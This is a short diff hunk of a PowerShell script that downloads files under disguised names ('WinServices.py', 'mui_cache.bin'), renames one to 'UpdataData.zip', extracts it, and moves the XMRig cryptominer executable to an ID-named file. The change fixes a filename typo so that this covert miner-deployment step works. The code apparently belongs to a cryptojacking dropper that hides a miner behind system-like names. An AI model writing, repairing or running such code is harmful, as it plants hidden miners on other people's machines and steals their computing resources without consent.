@@ -60,7 +60,7 @@ Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
 Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.bin"
 
 if (Test-Path "$Path\mui_cache.bin") {
-    Rename-Item -Path "$Path\mui_chache.bin" -NewName "UpdataData.zip" -Force
+    Rename-Item -Path "$Path\mui_cache.bin" -NewName "UpdataData.zip" -Force
     Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
     $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
     if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
